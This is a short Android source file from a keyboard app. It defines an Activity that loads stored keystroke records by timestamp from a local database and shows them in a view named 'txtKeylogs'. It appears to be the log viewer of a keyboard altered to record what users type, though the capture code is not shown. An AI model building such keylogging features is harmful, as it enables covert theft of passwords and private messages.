package org.pocketworkstation.pckeyboard;

import android.app.Activity;
import android.database.Cursor;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.text.Html;
import android.widget.TextView;

import java.util.ArrayList;

public class KeyStrokeData extends Activity {
    TextView txtLogs;
    DBHelper myDB = new DBHelper(this);
    ArrayList<String> dataStroke = new ArrayList<String>();
    String[] dataStrok;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.keystroke_data);

        String setTime = getIntent().getExtras().getString("getTime");


        txtLogs = findViewById(R.id.txtKeylogs);

        Cursor data = myDB.getAllDataByTime(setTime);
        StringBuffer stringBuffer = new StringBuffer();
        if(data!=null && data.getCount()>0){
            while (data.moveToNext()){
                stringBuffer.append(data.getString(0));
            }
        }

        txtLogs.setText(Html.fromHtml(stringBuffer.toString()));
    }
}